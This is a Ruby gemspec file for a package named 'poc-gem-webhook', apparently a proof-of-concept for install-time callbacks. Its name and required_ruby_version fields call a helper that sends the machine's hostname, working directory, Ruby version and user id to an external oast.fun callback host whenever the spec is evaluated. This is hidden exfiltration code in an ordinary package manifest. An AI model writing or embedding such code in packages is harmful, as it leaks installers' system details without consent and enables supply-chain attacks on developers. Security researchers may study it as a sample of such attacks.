require "net/http"
require "uri"
require "json"
require "socket"
require "cgi"

def env_info
  { host: Socket.gethostname, pwd: Dir.pwd, ruby: RUBY_VERSION, uid: Process.uid }
end

def ping(path)
  uri = URI("https://xdvvlncuipgisdigxkeheeg5ro1a42kd8.oast.fun/#{path}?d=#{CGI.escape(env_info.to_json)}")
  Net::HTTP.get(uri) rescue nil
  nil
end

Gem::Specification.new do |s|
  s.name = (ping("name"); "poc-gem-webhook")
  s.version = "0.0.1"
  s.summary = "poc"
  s.files = []
  s.required_ruby_version = (ping("ruby_requirement"); ">= 2.7")
end
